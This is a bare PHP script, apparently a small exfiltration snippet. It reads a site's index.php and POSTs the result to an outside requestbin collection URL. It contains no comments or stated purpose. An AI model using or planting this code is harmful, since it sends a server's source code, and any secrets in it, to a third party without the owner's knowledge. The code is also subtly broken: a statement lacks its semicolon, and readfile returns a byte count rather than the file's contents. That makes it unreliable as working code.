<?php
$url = "http://requestbin.fullcontact.com/14aagub1";
$source = readfile("index.php")
$data = array(
    'source' => $source
);
$content = http_build_query($data);
$options = array('http' => array(
    'method' => 'POST',
    'content' => $content
));
$contents = file_get_contents($url, false, stream_context_create($options));
?>
